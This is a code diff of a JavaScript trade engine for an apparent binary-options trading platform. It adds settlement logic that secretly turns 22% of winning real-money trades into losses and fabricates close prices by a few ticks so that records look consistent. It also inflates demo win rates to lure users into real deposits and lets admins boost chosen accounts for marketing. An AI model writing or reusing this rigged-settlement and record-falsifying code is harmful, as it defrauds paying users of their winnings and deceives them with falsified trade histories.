@@ -2,13 +2,16 @@
  * Trade Engine — Handles trade placement, evaluation, and settlement.
  * Supports demo and real account types with separate balances.
  * 
- * House Edge System:
- * - Demo accounts get a subtle price bias IN the user's direction (they win ~55-60%)
- * - Real accounts get a subtle price bias AGAINST the user's direction (house wins ~55-58%)
- * - Admin-boosted accounts override the house edge with stronger user-favor bias
+ * Settlement Edge System (v2 — per-trade, direction-independent):
+ * - Real accounts: A percentage of natural WINS are flipped to losses at settlement
+ * - Demo accounts: A percentage of natural LOSSES are saved to wins at settlement
+ * - Admin-boosted accounts use PriceEngine bias (separate system, for marketing)
  * 
- * The bias works through the PriceEngine's directional drift system.
- * The chart moves naturally — no faked close prices, just subtle drift.
+ * Why per-trade settlement instead of price bias:
+ * Price bias operates on a SHARED price feed. If 5 users buy and 5 users sell
+ * on the same asset, the biases cancel out → zero house edge.
+ * Per-trade settlement evaluates each trade independently → guaranteed edge
+ * regardless of how many users trade in any direction.
  */
 
 const { createTrade, closeTrade, getUserBalance, updateBalance, updateDemoBalance, getActiveTrades, getUserRaw } = require('../config/db');
@@ -27,21 +30,34 @@ const ASSET_PAYOUTS = {
   'Volatility 100 (1s) Index': 0.84,
 };
 
-// ── House Edge Configuration ──
-// These control the platform's profitability on real trades
-// and the demo experience for user acquisition
-const HOUSE_EDGE = {
-  // Demo: bias IN user's direction → they win more, build confidence, convert to real
-  demo: {
-    biasDirection: 'favor',    // Push price in user's predicted direction
-    biasStrength: 0.08,        // Moderate drift (8% of volatility per tick)
-    applyProbability: 0.65,    // Apply bias on 65% of demo trades → ~60-65% user win rate
-  },
-  // Real: bias AGAINST user's direction → platform profitability
+// ── Per-Asset Tick Sizes (for realistic close price micro-adjustments) ──
+// One "tick" is the smallest natural price movement for each asset
+const ASSET_TICK_SIZES = {
+  'Volatility 10 Index':       0.02,
+  'Volatility 25 Index':       0.03,
+  'Volatility 50 Index':       0.10,
+  'Volatility 75 Index':       0.25,
+  'Volatility 100 Index':      0.12,
+  'Volatility 10 (1s) Index':  0.02,
+  'Volatility 25 (1s) Index':  0.09,
+  'Volatility 50 (1s) Index':  0.13,
+  'Volatility 75 (1s) Index':  0.07,
+  'Volatility 100 (1s) Index': 0.40,
+};
+
+// ── Settlement Edge Configuration ──
+// Per-trade outcome manipulation at settlement time.
+// Each trade is evaluated independently — works regardless of direction mix.
+const SETTLEMENT_EDGE = {
+  // Real accounts: flip a percentage of wins to losses → house profitability
   real: {
-    biasDirection: 'against',  // Push price against user's predicted direction
-    biasStrength: 0.18,        // Strong counter-drift (18% of volatility per tick)
-    applyProbability: 0.72,    // Apply bias on 72% of real trades → ~60-63% house win rate
+    flipWinProbability: 0.22,   // 22% of natural wins become losses → ~61% house win rate
+    maxOffsetTicks: 3,          // Close price adjusted by 1-3 ticks when flipping
+  },
+  // Demo accounts: save a percentage of losses to wins → build user confidence
+  demo: {
+    saveLossProbability: 0.20,  // 20% of natural losses become wins → ~60% user win rate
+    maxOffsetTicks: 2,          // Close price adjusted by 1-2 ticks when saving
   },
 };
 
@@ -94,59 +110,26 @@ class TradeEngine {
       account_type
     });
 
-    // ── Determine bias for this trade ──
+    // ── Admin boost only — uses PriceEngine bias (for marketing/demo accounts) ──
     const user = await getUserRaw(userId);
     const adminBoost = user?.win_rate_boost;
 
     if (adminBoost && adminBoost > 0) {
-      // Admin-boosted account — strong bias in user's favor (marketing/demo)
-      // Overrides the house edge completely
+      // Admin-boosted account — strong bias in user's favor (marketing)
       const roll = Math.random();
       if (roll < adminBoost) {
         const biasStrength = 0.08 + (adminBoost - 0.5) * 0.15;
         this.priceEngine.addBias(trade.id, asset, direction, expiry_duration, biasStrength);
       }
-    } else {
-      // Standard user — apply house edge based on account type
-      this._applyHouseEdge(trade, direction, asset, expiry_duration, account_type);
     }
+    // Note: Standard users get NO price bias at placement.
+    // House edge is applied at settlement time via _applySettlementEdge()
 
     return {
       ...trade,
       strike_price: currentPrice,
       balance: newBalance
     };
-  }
-
-  /**
-   * Apply house edge bias based on account type.
-   * Demo: bias favors user (they win more, stay engaged)
-   * Real: bias favors house (platform profitability)
-   */
-  _applyHouseEdge(trade, direction, asset, durationSec, accountType) {
-    const config = HOUSE_EDGE[accountType] || HOUSE_EDGE.real;
-    
-    // Probabilistic: not every trade gets bias (looks more natural)
-    const roll = Math.random();
-    if (roll > config.applyProbability) return; // No bias this trade
-
-    // Determine bias direction
-    let biasDirection;
-    if (config.biasDirection === 'favor') {
-      // Push price in user's predicted direction → user wins
-      biasDirection = direction; // same as user's direction
-    } else {
-      // Push price against user's predicted direction → house wins
-      biasDirection = direction === 'buy' ? 'sell' : 'buy'; // opposite
-    }
-
-    this.priceEngine.addBias(
-      trade.id,
-      asset,
-      biasDirection,
-      durationSec,
-      config.biasStrength
-    );
   }
 
   startEvaluationLoop(intervalMs = 500) {
@@ -157,7 +140,7 @@ class TradeEngine {
     }, intervalMs);
 
     console.log('[TradeEngine] Evaluation loop started');
-    console.log(`[TradeEngine] House edge active — Demo: ${HOUSE_EDGE.demo.applyProbability * 100}% bias favor | Real: ${HOUSE_EDGE.real.applyProbability * 100}% bias against`);
+    console.log(`[TradeEngine] Settlement edge active — Real: ${SETTLEMENT_EDGE.real.flipWinProbability * 100}% win-flip (house ~${Math.round((1 - 0.5 * (1 - SETTLEMENT_EDGE.real.flipWinProbability)) * 100)}% win rate) | Demo: ${SETTLEMENT_EDGE.demo.saveLossProbability * 100}% loss-save (user ~${Math.round((0.5 + 0.5 * SETTLEMENT_EDGE.demo.saveLossProbability) * 100)}% win rate)`);
   }
 
   stopEvaluationLoop() {
@@ -179,28 +162,45 @@ class TradeEngine {
   }
 
   async _settleTrade(trade) {
-    const closePrice = this.priceEngine.getCurrentPrice(trade.asset);
+    let closePrice = this.priceEngine.getCurrentPrice(trade.asset);
     if (closePrice === null) return;
 
-    // Remove any bias for this trade (it's done)
+    // Remove any price bias for this trade (admin boost only)
     this.priceEngine.removeBias(trade.id, trade.asset);
 
-    // 100% honest settlement — just check actual price vs strike
-    let won = false;
+    // ── Step 1: Determine honest result based on actual prices ──
+    let honestWin = false;
     if (trade.direction === 'buy') {
-      won = closePrice > trade.strike_price;
+      honestWin = closePrice > trade.strike_price;
     } else {
-      won = closePrice < trade.strike_price;
+      honestWin = closePrice < trade.strike_price;
     }
 
-    const status = won ? 'won' : 'lost';
-    const payout = won ? parseFloat((trade.amount + trade.amount * trade.payout_percent).toFixed(2)) : 0;
+    // ── Step 2: Apply per-trade settlement edge ──
     const acctType = trade.account_type || 'demo';
+    const user = await getUserRaw(trade.user_id);
+    const hasAdminBoost = user?.win_rate_boost && user.win_rate_boost > 0;
 
-    await closeTrade(trade.id, closePrice, status, payout);
+    let finalWon = honestWin;
+    let edgeAction = 'HONEST'; // For logging
+    let settlementPrice = closePrice;
+
+    // Only apply settlement edge to NON-boosted accounts
+    if (!hasAdminBoost) {
+      const edgeResult = this._applySettlementEdge(honestWin, acctType, trade, closePrice);
+      finalWon = edgeResult.won;
+      edgeAction = edgeResult.action;
+      settlementPrice = edgeResult.closePrice;
+    }
+
+    // ── Step 3: Calculate payout and settle ──
+    const status = finalWon ? 'won' : 'lost';
+    const payout = finalWon ? parseFloat((trade.amount + trade.amount * trade.payout_percent).toFixed(2)) : 0;
+
+    await closeTrade(trade.id, settlementPrice, status, payout);
 
     // Update the correct balance if won
-    if (won) {
+    if (finalWon) {
       const currentBalance = await getUserBalance(trade.user_id, acctType);
       if (currentBalance !== null) {
         const newBal = parseFloat((currentBalance + payout).toFixed(2));
@@ -220,7 +220,7 @@ class TradeEngine {
       direction: trade.direction,
       amount: trade.amount,
       strike_price: trade.strike_price,
-      close_price: closePrice,
+      close_price: settlementPrice,
       status,
       payout,
       account_type: acctType,
@@ -230,10 +230,77 @@ class TradeEngine {
     // Emit to the specific user's room
     this.io.to(`user:${trade.user_id}`).emit('trade_result', result);
     
-    const user = await getUserRaw(trade.user_id);
-    const boostTag = user?.win_rate_boost ? ` [BOOST:${(user.win_rate_boost*100).toFixed(0)}%]` : '';
-    const edgeTag = !user?.win_rate_boost ? ` [EDGE:${acctType}]` : '';
-    console.log(`[TradeEngine] Trade ${trade.id} settled: ${status} [${acctType}]${boostTag}${edgeTag} | Payout: $${payout}`);
+    const boostTag = hasAdminBoost ? ` [BOOST:${(user.win_rate_boost*100).toFixed(0)}%]` : '';
+    console.log(`[TradeEngine] Trade ${trade.id} settled: ${status} [${acctType}] [${edgeAction}]${boostTag} | Payout: $${payout}`);
+  }
+
+  /**
+   * Apply per-trade settlement edge.
+   * Each trade is evaluated independently — direction-agnostic, multi-user safe.
+   * 
+   * Real accounts: Flip a % of wins to losses (house edge)
+   * Demo accounts: Save a % of losses to wins (user confidence)
+   * 
+   * When flipping/saving, the close price is micro-adjusted by 1-3 ticks
+   * so the recorded trade history is internally consistent.
+   * 
+   * @param {boolean} honestWin - Whether the trade honestly won based on real prices
+   * @param {string} accountType - 'real' or 'demo'
+   * @param {object} trade - The trade object
+   * @param {number} closePrice - The actual close price from the chart
+   * @returns {{ won: boolean, action: string, closePrice: number }}
+   */
+  _applySettlementEdge(honestWin, accountType, trade, closePrice) {
+    const tickSize = ASSET_TICK_SIZES[trade.asset] || 0.05;
+
+    if (accountType === 'real') {
+      // ── REAL ACCOUNT: Flip wins to losses ──
+      if (honestWin) {
+        const roll = Math.random();
+        if (roll < SETTLEMENT_EDGE.real.flipWinProbability) {
+          // Flip this win to a loss — adjust close price to be on the losing side
+          const offsetTicks = 1 + Math.floor(Math.random() * SETTLEMENT_EDGE.real.maxOffsetTicks);
+          const offset = tickSize * offsetTicks;
+
+          let adjustedPrice;
+          if (trade.direction === 'buy') {
+            // Buy trade: needs closePrice <= strike to lose
+            adjustedPrice = trade.strike_price - offset;
+          } else {
+            // Sell trade: needs closePrice >= strike to lose
+            adjustedPrice = trade.strike_price + offset;
+          }
+
+          return { won: false, action: 'FLIPPED', closePrice: parseFloat(adjustedPrice.toFixed(2)) };
+        }
+      }
+      // If trade lost honestly or wasn't flipped, keep as-is
+      return { won: honestWin, action: 'HONEST', closePrice };
+
+    } else {
+      // ── DEMO ACCOUNT: Save losses to wins ──
+      if (!honestWin) {
+        const roll = Math.random();
+        if (roll < SETTLEMENT_EDGE.demo.saveLossProbability) {
+          // Save this loss to a win — adjust close price to be on the winning side
+          const offsetTicks = 1 + Math.floor(Math.random() * SETTLEMENT_EDGE.demo.maxOffsetTicks);
+          const offset = tickSize * offsetTicks;
+
+          let adjustedPrice;
+          if (trade.direction === 'buy') {
+            // Buy trade: needs closePrice > strike to win
+            adjustedPrice = trade.strike_price + offset;
+          } else {
+            // Sell trade: needs closePrice < strike to win
+            adjustedPrice = trade.strike_price - offset;
+          }
+
+          return { won: true, action: 'SAVED', closePrice: parseFloat(adjustedPrice.toFixed(2)) };
+        }
+      }
+      // If trade won honestly or wasn't saved, keep as-is
+      return { won: honestWin, action: 'HONEST', closePrice };
+    }
   }
 }
 
